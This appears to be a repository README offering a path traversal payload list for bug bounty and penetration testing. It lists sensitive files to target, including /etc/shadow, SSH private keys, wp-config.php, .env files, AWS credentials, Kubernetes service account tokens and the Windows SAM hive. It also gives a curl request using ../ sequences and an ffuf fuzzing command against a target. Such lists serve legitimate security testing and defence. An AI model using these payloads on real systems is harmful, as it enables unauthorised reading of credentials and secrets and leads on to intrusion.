# Directory Traversal Payload List

This repository contains a curated list of **directory traversal / path traversal** payloads.  
Use this for **educational purposes, bug bounty, or penetration testing** only.  

--- 

## 🖥 System Files
- /etc/passwd
- /etc/shadow
- /etc/group
- /etc/hosts
- /etc/hostname
- /etc/issue
- /etc/os-release

## 🔑 Credentials
- /root/.ssh/id_rsa
- /home/<user>/.ssh/id_rsa
- /etc/mysql/my.cnf
- /var/www/html/config.php
- /var/www/html/wp-config.php
- /var/www/html/.env

## 🌐 Web Configs
- /etc/apache2/apache2.conf
- /etc/nginx/nginx.conf
- /etc/phpmyadmin/config.inc.php

## 📝 Logs
- /var/log/auth.log
- /var/log/apache2/error.log
- /var/log/nginx/access.log
- /var/log/syslog

## 🛠 Process
- /proc/self/environ
- /proc/self/cmdline

## ☁️ Cloud / Containers
- /root/.aws/credentials
- /var/run/secrets/kubernetes.io/serviceaccount/token
- /var/lib/docker/

## 🖥 Windows
- C:\Windows\System32\drivers\etc\hosts
- C:\Windows\System32\config\SAM
- C:\Users\<user>\.ssh\id_rsa
- C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

---

## 🔧 Usage Example
```bash
# Linux
curl "http://target.com/download?file=../../../../etc/passwd"

# Fuzz with ffuf
ffuf -u http://target.com/download?file=FUZZ -w traversal.txt
